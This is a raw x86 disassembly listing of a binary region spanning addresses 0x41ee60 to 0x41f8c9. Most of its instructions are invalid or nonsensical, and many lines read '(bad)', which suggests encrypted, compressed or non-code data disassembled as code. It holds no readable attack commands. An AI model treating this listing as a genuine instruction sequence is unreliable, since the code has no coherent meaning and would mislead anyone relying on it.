  41ee60:	(bad)  
  41ee61:	(bad)  
  41ee63:	xchg   esi,eax
  41ee64:	enter  0xa15b,0x4a
  41ee68:	xor    al,0x19
  41ee6a:	sub    al,BYTE PTR [ecx+0x5e]
  41ee6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41eed6:	add    eax,0x7b197956
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x6704:0xa25524e7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	sub    dh,dl
  41eef0:	mov    edx,0xb82f3314
  41eef5:	scas   al,BYTE PTR es:[edi]
  41eef6:	arpl   di,dx
  41eef8:	dec    edi
  41eef9:	xchg   edi,eax
  41eefa:	and    eax,0xbad196cf
  41eeff:	push   cs
  41ef00:	push   ds
  41ef01:	int3   
  41ef02:	pusha  
  41ef03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef04:	and    edi,DWORD PTR [edi+0x20b1154b]
  41ef0a:	arpl   bp,ax
  41ef0c:	add    esp,ecx
  41ef0e:	xor    DWORD PTR [ecx+0x256035d4],ebp
  41ef14:	sbb    dl,cl
  41ef16:	inc    BYTE PTR [edx-0x2ad0acb1]
  41ef1c:	mov    DWORD PTR ds:0xba784de5,edx
  41ef22:	inc    ebp
  41ef23:	adc    cl,ah
  41ef25:	retf   
  41ef26:	faddp  st(6),st
  41ef28:	outs   dx,BYTE PTR ds:[esi]
  41ef29:	into   
  41ef2a:	aas    
  41ef2b:	mov    ss,WORD PTR [eax-0x65]
  41ef2e:	inc    edx
  41ef2f:	dec    esp
  41ef30:	xchg   edi,eax
  41ef31:	mov    dh,0xe0
  41ef33:	add    BYTE PTR [eax-0x20],bl
  41ef36:	add    dl,BYTE PTR [edx]
  41ef38:	cmp    DWORD PTR [edi+0x70bd6682],0xffffffb1
  41ef3f:	xchg   ebp,eax
  41ef40:	enter  0xf09b,0x7f
  41ef44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef45:	pushf  
  41ef46:	call   DWORD PTR [esi]
  41ef48:	dec    edi
  41ef49:	dec    ebp
  41ef4a:	mov    ds:0xf067bb30,eax
  41ef4f:	jo     0x41eed6
  41ef51:	xor    eax,0x35bfe58f
  41ef56:	int3   
  41ef57:	nop
  41ef58:	mov    edx,0xa77f3129
  41ef5d:	push   ds
  41ef5e:	pop    edi
  41ef5f:	iret   
  41ef60:	or     BYTE PTR [esi-0x6dbafbda],dl
  41ef66:	shl    DWORD PTR [ebp+0x3d92c5ca],cl
  41ef6c:	push   ecx
  41ef6d:	mov    BYTE PTR [esi+eax*8],al
  41ef70:	fimul  DWORD PTR [ebp+0x6a]
  41ef73:	or     bh,BYTE PTR [esi-0x27]
  41ef76:	cli    
  41ef77:	ds cwde 
  41ef79:	es loope 0x41ef2e
  41ef7c:	xchg   esi,eax
  41ef7d:	bound  edx,QWORD PTR ds:0x8ec08dc3
  41ef83:	dec    edx
  41ef84:	dec    esp
  41ef85:	in     eax,dx
  41ef86:	push   ebp
  41ef87:	sbb    dh,al
  41ef89:	and    eax,0xac9a617e
  41ef8e:	out    0xad,eax
  41ef90:	(bad)  
  41ef91:	sti    
  41ef92:	clc    
  41ef93:	and    eax,0xc967b421
  41ef98:	dec    ecx
  41ef99:	pop    edi
  41ef9a:	pop    ss
  41ef9b:	pop    ebx
  41ef9c:	outs   dx,BYTE PTR ds:[esi]
  41ef9d:	or     eax,esp
  41ef9f:	fcmovnb st,st(7)
  41efa1:	retf   0x275
  41efa4:	mov    edi,0x3e7f9388
  41efa9:	add    esi,esi
  41efab:	std    
  41efac:	dec    esp
  41efad:	test   BYTE PTR fs:0xa73f41c5,ch
  41efb4:	call   0xef257a19
  41efb9:	xor    DWORD PTR [ebx+esi*4+0x30],edi
  41efbd:	faddp  st(6),st
  41efbf:	aam    0xa1
  41efc1:	pop    esi
  41efc2:	dec    edi
  41efc3:	fwait
  41efc4:	mov    edi,0xe5dc3d43
  41efc9:	repz add ecx,DWORD PTR [ecx]
  41efcc:	mov    dl,0x8d
  41efce:	cmp    ah,BYTE PTR [edx+0x5e]
  41efd1:	pop    edx
  41efd2:	daa    
  41efd3:	adc    ebx,DWORD PTR [ebx]
  41efd5:	cld    
  41efd6:	in     al,dx
  41efd7:	(bad)  
  41efd8:	mov    esp,0x36df664d
  41efdd:	shl    bh,cl
  41efdf:	cmp    al,BYTE PTR [ebx+0x28c09766]
  41efe5:	lods   al,BYTE PTR ds:[esi]
  41efe6:	fisttp WORD PTR [edi+0x6f]
  41efe9:	out    0x1,eax
  41efeb:	dec    edx
  41efec:	data16 lahf 
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ecx,DWORD PTR [ebx],0x70
  41f064:	jg     0x41f082
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	mov    eax,0xc49d9013
  41f073:	ret    0xe769
  41f076:	loop   0x41f0db
  41f078:	jnp    0x41f0c1
  41f07a:	jmp    0x2b16f8d6
  41f07f:	outs   dx,DWORD PTR ds:[esi]
  41f080:	and    BYTE PTR [esi-0x4928a3d7],dh
  41f086:	out    0x73,al
  41f088:	ins    BYTE PTR es:[edi],dx
  41f089:	sbb    BYTE PTR [esp+edx*4-0x20],al
  41f08d:	dec    eax
  41f08e:	inc    eax
  41f08f:	mov    DWORD PTR [eax+0x5ab2dfc3],ebp
  41f095:	jp     0x906fff12
  41f09b:	dec    eax
  41f09c:	adc    DWORD PTR [esi],0x74
  41f09f:	loope  0x41f025
  41f0a1:	pop    ecx
  41f0a2:	les    eax,FWORD PTR [ecx+0x68a9f7a7]
  41f0a8:	test   al,0xbc
  41f0aa:	mov    edx,0x9102e91f
  41f0af:	push   es
  41f0b0:	and    eax,0xf7612aea
  41f0b5:	scas   al,BYTE PTR es:[edi]
  41f0b6:	neg    eax
  41f0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b9:	push   ds
  41f0ba:	mov    bh,0x49
  41f0bc:	mov    esp,0x75d8af3f
  41f0c1:	out    0x19,al
  41f0c3:	pusha  
  41f0c4:	add    eax,0x8c057d96
  41f0c9:	xchg   edi,eax
  41f0ca:	or     bl,al
  41f0cc:	mov    edx,?
  41f0ce:	jne    0x41f116
  41f0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d1:	mov    ss,WORD PTR [edi-0x19]
  41f0d4:	mov    edi,0xc170d244
  41f0d9:	bound  esi,QWORD PTR ds:0x98aa31de
  41f0df:	dec    esi
  41f0e0:	xchg   esp,eax
  41f0e1:	adc    DWORD PTR [ebx+0x4dc1320a],ebx
  41f0e7:	in     al,0x62
  41f0e9:	push   cs
  41f0ea:	fs iret 
  41f0ec:	call   DWORD PTR [ebx+esi*1+0x2944f196]
  41f0f3:	jne    0x41f150
  41f0f5:	out    0xdc,eax
  41f0f7:	pop    edx
  41f0f8:	xchg   BYTE PTR ds:0x87d4bfa5,cl
  41f0fe:	inc    esi
  41f0ff:	inc    eax
  41f100:	jb     0x41f151
  41f102:	dec    esp
  41f103:	(bad)  
  41f104:	es cli 
  41f106:	cmp    ah,BYTE PTR [eax-0x4059bd0f]
  41f10c:	std    
  41f10d:	retf   
  41f10e:	adc    al,ah
  41f110:	hlt    
  41f111:	scas   al,BYTE PTR es:[edi]
  41f112:	dec    edx
  41f113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f114:	xor    BYTE PTR [edx+0x69],ch
  41f117:	mov    ebx,0x8e6acd0b
  41f11c:	mov    dh,BYTE PTR [eax-0xad89e9a]
  41f122:	add    al,0x95
  41f124:	mov    edx,edi
  41f126:	mov    bh,0x9b
  41f128:	gs jno 0x41f180
  41f12b:	sub    BYTE PTR [edi-0xabc966b],0x51
  41f132:	cmp    DWORD PTR [eax],edi
  41f134:	fisttp QWORD PTR [ebp-0x6c]
  41f137:	pop    ds
  41f138:	(bad)  
  41f139:	push   esp
  41f13a:	add    al,bh
  41f13c:	mov    cl,0x91
  41f13e:	js     0x41f19e
  41f140:	enter  0xc605,0x6f
  41f144:	imul   ebp,DWORD PTR [ecx-0x2dff7fe2],0xffffffcc
  41f14b:	xlat   BYTE PTR ds:[ebx]
  41f14c:	jg     0x41f14d
  41f14e:	into   
  41f14f:	cs ds dec ebx
  41f152:	mov    esp,es
  41f154:	lahf   
  41f155:	aad    0xbb
  41f157:	int3   
  41f158:	into   
  41f159:	nop
  41f15a:	mov    bl,0xb0
  41f15c:	ror    eax,1
  41f15e:	add    esp,DWORD PTR [esi]
  41f160:	dec    edi
  41f161:	ret    0x349c
  41f164:	shl    BYTE PTR [edi+edx*1-0x426f040d],cl
  41f16b:	int3   
  41f16c:	jae    0x41f150
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xd6b785f0
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	cwde   
  41f1ef:	push   ss
  41f1f0:	in     al,dx
  41f1f1:	cdq    
  41f1f2:	sbb    BYTE PTR [edi],dh
  41f1f4:	(bad)  
  41f1f5:	cli    
  41f1f6:	jmp    0x491b:0xbb43bce0
  41f1fd:	or     edx,DWORD PTR [ebx+ecx*4+0x2e]
  41f201:	cmp    esi,DWORD PTR [edi+ecx*1-0x3db8895b]
  41f208:	push   cs
  41f209:	add    edx,ecx
  41f20b:	mov    dl,0xee
  41f20d:	scas   eax,DWORD PTR es:[edi]
  41f20e:	sar    DWORD PTR [esi+0x5920a7fa],0x5a
  41f215:	hlt    
  41f216:	ss addr16 pop es
  41f219:	xchg   edi,eax
  41f21a:	pop    edi
  41f21b:	repnz pop ecx
  41f21d:	jl     0x41f28f
  41f21f:	sub    al,ch
  41f221:	push   ebp
  41f222:	popa   
  41f223:	jle    0x41f267
  41f225:	ficomp DWORD PTR [ecx-0x382444]
  41f22b:	in     eax,0xd4
  41f22d:	push   0x11
  41f22f:	not    esi
  41f231:	mov    eax,0xbdb6302a
  41f236:	js     0x41f296
  41f238:	add    al,0xe9
  41f23a:	fucomi st,st(0)
  41f23c:	test   BYTE PTR [edi-0x70],dl
  41f23f:	inc    edx
  41f240:	(bad)  
  41f241:	sub    esp,DWORD PTR [edx]
  41f243:	jg     0xef78b374
  41f249:	sbb    esp,ebp
  41f24b:	push   0x26
  41f24d:	psubq  mm7,QWORD PTR [esi+0x2011f138]
  41f254:	bound  ecx,QWORD PTR [ebx]
  41f256:	int3   
  41f257:	dec    edx
  41f258:	dec    ebx
  41f259:	adc    eax,0x8301e636
  41f25e:	push   es
  41f25f:	fisubr WORD PTR [ebx-0x58]
  41f262:	leave  
  41f263:	clc    
  41f264:	xchg   ebp,eax
  41f265:	test   BYTE PTR [esp+ebx*2+0x10],cl
  41f269:	jle    0x41f247
  41f26b:	lahf   
  41f26c:	xor    bl,al
  41f26e:	and    eax,0x9fcbe4c5
  41f273:	test   eax,0x7d26d761
  41f278:	adc    dh,BYTE PTR [edx-0x7e]
  41f27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f27c:	cmp    esi,DWORD PTR [ebx-0x406e5596]
  41f282:	lock sub eax,0xe77121fd
  41f288:	inc    ebx
  41f289:	sub    ebx,DWORD PTR [ecx]
  41f28b:	inc    ebp
  41f28c:	ret    0xee3
  41f28f:	adc    ebx,DWORD PTR [ebp+ebp*8+0x75]
  41f293:	sub    al,0x25
  41f295:	push   ebp
  41f296:	and    eax,0x12e4594c
  41f29b:	stc    
  41f29c:	xchg   edi,eax
  41f29d:	sbb    al,0xb5
  41f29f:	pushf  
  41f2a0:	add    ecx,DWORD PTR [ecx+0x6f172c3]
  41f2a6:	neg    BYTE PTR [ecx-0x1f4970a1]
  41f2ac:	pop    esi
  41f2ad:	mov    ds:0x925e66aa,eax
  41f2b2:	rcr    dh,cl
  41f2b4:	pop    ss
  41f2b5:	sub    eax,0x3815d430
  41f2ba:	push   ebx
  41f2bb:	and    al,0x87
  41f2bd:	pop    ss
  41f2be:	sar    BYTE PTR [edi-0xe],1
  41f2c1:	ja     0x41f2f3
  41f2c3:	pop    es
  41f2c4:	(bad)  
  41f2c5:	mov    al,ds:0x5791a2dc
  41f2ca:	push   esp
  41f2cb:	sbb    al,0x70
  41f2cd:	inc    ebp
  41f2ce:	ret    0x41c1
  41f2d1:	inc    DWORD PTR ds:[ebx+0x698b3734]
  41f2d8:	aaa    
  41f2d9:	sub    ecx,edi
  41f2db:	aas    
  41f2dc:	xchg   edx,eax
  41f2dd:	cmp    DWORD PTR [esi],esi
  41f2df:	pushf  
  41f2e0:	out    0xbf,al
  41f2e2:	cdq    
  41f2e3:	ins    DWORD PTR es:[edi],dx
  41f2e4:	push   edi
  41f2e5:	mov    BYTE PTR [ecx+0x64c86a89],bh
  41f2eb:	std    
  41f2ec:	and    bl,dh
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f331
  41f363:	sbb    BYTE PTR cs:[ebp+0x67],bh
  41f367:	dec    edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	push   esp
  41f36f:	sahf   
  41f370:	popa   
  41f371:	sbb    esi,esi
  41f373:	ins    BYTE PTR es:[edi],dx
  41f374:	in     eax,0x36
  41f376:	cmp    ebp,0x2
  41f379:	in     al,dx
  41f37a:	js     0x41f31d
  41f37c:	xor    ch,0x76
  41f37f:	je     0x41f355
  41f381:	push   ds
  41f382:	mov    eax,ds:0xdf2efb95
  41f387:	push   ebx
  41f388:	sub    BYTE PTR [ebx-0x8],bh
  41f38b:	xor    dh,ch
  41f38d:	arpl   bx,si
  41f38f:	(bad)  
  41f390:	gs dec ebx
  41f392:	jge    0x41f3d9
  41f394:	fisttp DWORD PTR [esp+ecx*4+0x57bf3622]
  41f39b:	xor    dh,0xb9
  41f39e:	retf   
  41f39f:	retf   0x7a2c
  41f3a2:	and    eax,0xa30afaae
  41f3a7:	or     ebx,DWORD PTR [esp+edi*4-0x3a59c758]
  41f3ae:	sub    al,0x5e
  41f3b0:	pop    edi
  41f3b1:	and    eax,0x7b553a42
  41f3b6:	outs   dx,DWORD PTR ds:[esi]
  41f3b7:	add    DWORD PTR [ebx],esi
  41f3b9:	es xor al,0x5f
  41f3bc:	fisttp DWORD PTR [edx]
  41f3be:	ja     0x41f398
  41f3c0:	int    0x2f
  41f3c2:	loopne 0x41f355
  41f3c4:	out    dx,eax
  41f3c5:	adc    DWORD PTR [ebx],0xffffffb5
  41f3c8:	mov    bh,0x5f
  41f3ca:	repnz cmp eax,0xabcd4766
  41f3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3d1:	mov    esi,0xbd06f682
  41f3d6:	mov    ch,0x55
  41f3d8:	adc    edi,DWORD PTR [eax+0x6b]
  41f3db:	inc    ecx
  41f3dc:	push   ds
  41f3dd:	(bad)  
  41f3de:	push   ebp
  41f3df:	cmc    
  41f3e0:	or     eax,0x5c2abc9b
  41f3e5:	fs add eax,0xc6de8051
  41f3eb:	loope  0x41f416
  41f3ed:	xchg   ebx,eax
  41f3ee:	sti    
  41f3ef:	pop    ebp
  41f3f0:	dec    esi
  41f3f1:	inc    edi
  41f3f2:	data16 cmp BYTE PTR [esi],al
  41f3f5:	dec    eax
  41f3f6:	inc    ebx
  41f3f7:	ja     0x41f3fd
  41f3f9:	stc    
  41f3fa:	mov    al,0xec
  41f3fc:	dec    edi
  41f3fd:	push   esi
  41f3fe:	stos   BYTE PTR es:[edi],al
  41f3ff:	mov    al,ds:0x7481fae9
  41f404:	(bad)  
  41f405:	inc    esi
  41f406:	mov    ds:0x6b18bf48,eax
  41f40b:	or     DWORD PTR [ebx],edx
  41f40d:	fidiv  WORD PTR [ecx+0xb60edb6]
  41f413:	push   0xffffff95
  41f415:	hlt    
  41f416:	jl     0x41f3e8
  41f418:	xor    al,0xf1
  41f41a:	cmp    eax,0x90816f58
  41f41f:	mov    bh,0x88
  41f421:	cdq    
  41f422:	mov    edx,0xe087b395
  41f427:	inc    ecx
  41f428:	fmul   QWORD PTR [edi-0x5384cec2]
  41f42e:	cmc    
  41f42f:	inc    esi
  41f430:	adc    ebx,DWORD PTR [edx+0x5945426d]
  41f436:	jmp    0x42838e2e
  41f43b:	sbb    edx,DWORD PTR [ebp-0x46]
  41f43e:	fst    st(0)
  41f440:	pop    edi
  41f441:	inc    edi
  41f442:	leave  
  41f443:	fcmovbe st,st(0)
  41f445:	test   BYTE PTR [edx+0x5669f30e],dl
  41f44b:	xlat   BYTE PTR ds:[ebx]
  41f44c:	cld    
  41f44d:	enter  0x7386,0x53
  41f451:	or     eax,0x208f9d28
  41f456:	and    eax,0x3713e81d
  41f45b:	cwde   
  41f45c:	lahf   
  41f45d:	in     eax,dx
  41f45e:	pop    eax
  41f45f:	mov    cl,0x19
  41f461:	cdq    
  41f462:	mov    cl,0x6a
  41f464:	rcl    bh,1
  41f466:	inc    edx
  41f467:	xor    al,bl
  41f469:	aad    0xb7
  41f46b:	add    al,0xf0
  41f46d:	popa   
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xd6
  41f4e3:	test   edx,edi
  41f4e5:	push   ss
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	xchg   ebp,eax
  41f4ef:	xchg   ebx,eax
  41f4f0:	enter  0xcae2,0xc
  41f4f4:	fadd   QWORD PTR [ebp+0x302a104c]
  41f4fa:	jmp    0x6011:0x166582ba
  41f501:	call   0xf06f6d
  41f506:	xor    ah,dl
  41f508:	inc    eax
  41f509:	pusha  
  41f50a:	std    
  41f50b:	fld    st(6)
  41f50d:	retf   0xe743
  41f510:	mov    edi,0xd29f5727
  41f515:	dec    esi
  41f516:	jne    0x41f4b9
  41f518:	imul   esi,DWORD PTR [edi+0x9],0x22
  41f51c:	ja     0x41f563
  41f51e:	push   es
  41f51f:	(bad)  
  41f520:	frstor [ecx-0x4]
  41f523:	sbb    bl,bl
  41f525:	xor    esp,DWORD PTR [ecx+ebp*8]
  41f528:	jge    0x41f537
  41f52a:	aaa    
  41f52b:	push   esi
  41f52c:	jae    0x41f526
  41f52e:	fmul   st,st(7)
  41f530:	push   ds
  41f531:	add    ch,BYTE PTR [esi+eiz*2]
  41f534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f535:	in     eax,dx
  41f536:	sub    eax,0xf275b1c9
  41f53b:	sub    eax,0x694c457c
  41f540:	cs xchg esi,eax
  41f542:	xchg   esi,eax
  41f543:	fs icebp 
  41f545:	ja     0x41f527
  41f547:	fld    DWORD PTR [edx+0x2]
  41f54a:	mov    cl,0xdf
  41f54c:	js     0x41f4e6
  41f54e:	xchg   ebp,eax
  41f54f:	pop    ecx
  41f550:	out    dx,eax
  41f551:	jbe    0x41f55f
  41f553:	mov    ds:0x1e69fa6a,eax
  41f558:	push   ds
  41f559:	ins    BYTE PTR es:[edi],dx
  41f55a:	ret    0xf009
  41f55d:	ret    
  41f55e:	pop    ds
  41f55f:	fwait
  41f560:	outs   dx,DWORD PTR ds:[esi]
  41f561:	xchg   ecx,eax
  41f562:	xor    ebp,DWORD PTR [eax+0x1b]
  41f565:	mov    esi,0x4a8d6e2e
  41f56a:	xchg   DWORD PTR [edx-0x76],edi
  41f56d:	cs retf 
  41f56f:	outs   dx,DWORD PTR cs:[esi]
  41f571:	test   ebp,ebx
  41f573:	(bad)  
  41f574:	das    
  41f575:	cmp    ch,dh
  41f577:	push   es
  41f578:	ds ins DWORD PTR es:[edi],dx
  41f57a:	mov    esp,0x686b7100
  41f57f:	jl     0x41f5a5
  41f581:	dec    esi
  41f582:	adc    BYTE PTR [ebp+0x1e71ddf3],0xab
  41f589:	leave  
  41f58a:	sub    BYTE PTR [edx],ch
  41f58c:	add    DWORD PTR es:[edx+0x52],ebp
  41f590:	les    edi,FWORD PTR [ecx-0x506c974e]
  41f596:	iret   
  41f597:	mov    eax,ds:0x57a75fe
  41f59c:	lods   al,BYTE PTR ds:[esi]
  41f59d:	jmp    0x41f610
  41f59f:	mov    al,0xb5
  41f5a1:	jle    0x41f574
  41f5a3:	and    ch,BYTE PTR [edx-0x74]
  41f5a6:	xor    al,0x21
  41f5a8:	xor    BYTE PTR [ebp+eax*4+0x3903de6e],bl
  41f5af:	adc    BYTE PTR [edi+edi*2-0x25a6afa5],bh
  41f5b6:	popa   
  41f5b7:	into   
  41f5b8:	mov    ebx,0x1f025a72
  41f5bd:	pop    esp
  41f5be:	in     al,dx
  41f5bf:	pop    ecx
  41f5c0:	mov    edx,0x812c0036
  41f5c5:	xor    BYTE PTR [ebp+0x2b2aa118],dh
  41f5cb:	(bad)  
  41f5cc:	jb     0x41f571
  41f5ce:	out    dx,al
  41f5cf:	out    0x83,eax
  41f5d1:	(bad)  
  41f5d2:	jb     0x41f59e
  41f5d4:	jmp    0x41f55c
  41f5d6:	pop    esp
  41f5d7:	imul   esi,DWORD PTR [edi-0x373fd9fa],0xb991850c
  41f5e1:	cmp    ebp,edx
  41f5e3:	mov    ebx,0xd6f1100c
  41f5e8:	jns    0x41f659
  41f5ea:	add    ebp,esi
  41f5ec:	data16 add BYTE PTR ss:[eax],al
	...
  41f654:	add    BYTE PTR [eax],al
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0xdfe1:0x7785d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	(bad)  
  41f66f:	xchg   ebp,eax
  41f670:	sbb    al,0x92
  41f672:	jns    0x41f65a
  41f674:	div    BYTE PTR [ecx-0x16]
  41f677:	rol    esi,1
  41f679:	adc    BYTE PTR [edx+0x7e],dh
  41f67c:	in     eax,dx
  41f67d:	sub    ecx,DWORD PTR [ecx]
  41f67f:	out    dx,al
  41f680:	pop    ecx
  41f681:	aas    
  41f682:	cdq    
  41f683:	dec    ecx
  41f684:	cwde   
  41f685:	(bad)  
  41f686:	out    dx,al
  41f687:	push   ebp
  41f688:	inc    ebp
  41f689:	or     DWORD PTR [ebx+ecx*2],0xc284e080
  41f690:	test   DWORD PTR [ecx],esi
  41f692:	pop    ds
  41f693:	push   es
  41f694:	xor    BYTE PTR [edi-0x59f9cbb9],al
  41f69a:	mov    ebp,ebx
  41f69c:	ds mov ah,0x6e
  41f69f:	int    0xab
  41f6a1:	ds add bl,bl
  41f6a4:	enter  0xca4e,0x5e
  41f6a8:	cmp    edi,eax
  41f6aa:	inc    ecx
  41f6ab:	mov    fs,WORD PTR [ecx+0x52]
  41f6ae:	add    ch,BYTE PTR [edx]
  41f6b0:	(bad)  
  41f6b1:	mov    dl,0xde
  41f6b3:	std    
  41f6b4:	ja     0x41f6e1
  41f6b6:	jb     0x41f661
  41f6b8:	and    al,0x1a
  41f6ba:	add    eax,edx
  41f6bc:	aaa    
  41f6bd:	and    ebp,edi
  41f6bf:	lock mov WORD PTR [ebx*4+0x30b4f358],fs
  41f6c7:	repnz xor edx,ebx
  41f6ca:	push   edx
  41f6cb:	into   
  41f6cc:	rol    DWORD PTR [edi],1
  41f6ce:	xchg   BYTE PTR [eax],dl
  41f6d0:	jge    0x41f74b
  41f6d2:	clc    
  41f6d3:	in     al,0x95
  41f6d5:	push   ebx
  41f6d6:	mov    DWORD PTR [ebx+0x76],0xf95fe098
  41f6dd:	dec    ecx
  41f6de:	xor    eax,0xeef6f91d
  41f6e3:	mov    ecx,0x606e65ec
  41f6e8:	or     DWORD PTR [edx],esp
  41f6ea:	test   BYTE PTR ds:0x11f6205,dh
  41f6f0:	or     DWORD PTR [ecx+edx*4-0x49],ecx
  41f6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6f5:	adc    esi,DWORD PTR [edi]
  41f6f7:	cmp    DWORD PTR [ecx-0x7d],eax
  41f6fa:	jcxz   0x41f6bb
  41f6fd:	jmp    0xa20a3555
  41f702:	out    dx,eax
  41f703:	sbb    eax,0x2f12c106
  41f708:	cld    
  41f709:	repz mov esi,0x4bfd72f4
  41f70f:	aam    0x6f
  41f711:	fldcw  WORD PTR [esi]
  41f713:	mov    ecx,0xf6632593
  41f718:	xchg   ebx,eax
  41f719:	mov    ch,0xdd
  41f71b:	scas   eax,DWORD PTR es:[edi]
  41f71c:	js     0x41f728
  41f71e:	(bad)  
  41f71f:	jo     0x41f6ea
  41f721:	push   ds
  41f722:	lds    edi,FWORD PTR ds:0xec108ac6
  41f728:	retf   0xfcc6
  41f72b:	mov    ecx,0x514acbb7
  41f730:	addr16 clc 
  41f732:	sub    eax,DWORD PTR [eax+eiz*4-0x1bb2357a]
  41f739:	sbb    bl,BYTE PTR [edi-0x4347d35a]
  41f73f:	pop    ebx
  41f740:	aam    0x50
  41f742:	lea    edx,[ecx-0x52]
  41f745:	xchg   BYTE PTR [ebx],al
  41f747:	adc    eax,0x5e1b8010
  41f74c:	call   0x5cb7:0xe2e2882c
  41f753:	add    al,0xe5
  41f755:	call   0xa1b9:0x3e3d3cb8
  41f75c:	jecxz  0x41f795
  41f75e:	sbb    esi,DWORD PTR ds:0xa186c7a9
  41f764:	xor    al,BYTE PTR [edi]
  41f766:	sbb    esi,ecx
  41f768:	in     eax,0xc4
  41f76a:	imul   edx,DWORD PTR [eax],0x37
  41f76d:	icebp  
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x5a14:0xfc6c62d2
  41f7e5:	jmp    0x100:0x15267
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	nop
  41f7ef:	cdq    
  41f7f0:	stos   BYTE PTR es:[edi],al
  41f7f1:	test   ebp,eax
  41f7f3:	scas   eax,DWORD PTR es:[edi]
  41f7f4:	mov    ds:0x722f68f6,al
  41f7f9:	lds    ecx,FWORD PTR [edi+0x7fb5581d]
  41f7ff:	div    BYTE PTR [edx-0x5e2f73a6]
  41f805:	adc    al,0x6c
  41f807:	adc    ecx,DWORD PTR [esi+0x528c293b]
  41f80d:	pusha  
  41f80e:	cmc    
  41f80f:	sbb    DWORD PTR [eax-0x28ba9526],edx
  41f815:	xchg   edx,eax
  41f816:	or     al,0x5f
  41f818:	scas   al,BYTE PTR es:[edi]
  41f819:	pop    es
  41f81a:	adc    eax,0x47e8b139
  41f81f:	pop    esp
  41f820:	mov    dh,0x4b
  41f822:	cmp    eax,DWORD PTR ds:0xb6b97d2d
  41f828:	lock icebp 
  41f82a:	pop    ebp
  41f82b:	fimul  DWORD PTR [ecx+edi*2-0x6f4270a9]
  41f832:	ds mov esi,0x488099c7
  41f838:	pop    ds
  41f839:	push   es
  41f83a:	dec    esi
  41f83c:	sub    bl,dl
  41f83e:	add    al,0x34
  41f840:	aam    0x2c
  41f842:	test   eax,0x574bc0f0
  41f847:	call   0x6d5c:0x5cad2773
  41f84e:	and    al,BYTE PTR [edi-0x6a]
  41f851:	sbb    eax,0x50484b33
  41f856:	push   esp
  41f857:	pop    esp
  41f858:	leave  
  41f859:	mov    edi,0xe25968f1
  41f85e:	xchg   esp,eax
  41f85f:	push   esp
  41f860:	outs   dx,DWORD PTR ds:[esi]
  41f861:	enter  0x6863,0x29
  41f865:	retf   0x4a15
  41f868:	hlt    
  41f869:	daa    
  41f86a:	out    0x86,eax
  41f86c:	imul   BYTE PTR [ebp-0x57dacf6f]
  41f872:	push   edi
  41f873:	lahf   
  41f874:	push   edi
  41f875:	cmp    al,0xa0
  41f877:	fisttp WORD PTR [edi+0x68]
  41f87a:	clc    
  41f87b:	fcomip st,st(6)
  41f87d:	fdivp  st(1),st
  41f87f:	cmp    eax,0xe293ff65
  41f884:	push   edx
  41f885:	adc    eax,0x470dadc4
  41f88a:	popf   
  41f88b:	or     DWORD PTR [edi],0x178fa76b
  41f891:	pushf  
  41f892:	cmp    ecx,edi
  41f894:	adc    DWORD PTR cs:[ebx],ecx
  41f897:	fld    QWORD PTR [esi]
  41f899:	jb     0x41f886
  41f89b:	push   cs
  41f89c:	mov    al,0x27
  41f89e:	out    dx,eax
  41f89f:	push   edi
  41f8a0:	or     DWORD PTR [ecx-0x5],ebp
  41f8a3:	and    al,0xf1
  41f8a5:	jne    0x41f8d8
  41f8a7:	fld    DWORD PTR [edx-0x4d29a77]
  41f8ad:	fwait
  41f8ae:	jmp    0x41f8c1
  41f8b0:	mov    ebx,0xb2c167cc
  41f8b5:	cmp    al,0x39
  41f8b7:	(bad)  [edi-0xae80803]
  41f8bd:	push   0xe26667c6
  41f8c2:	inc    esi
  41f8c3:	mov    edi,0x13a784a
  41f8c8:	pusha  
  41f8c9:	aaa    
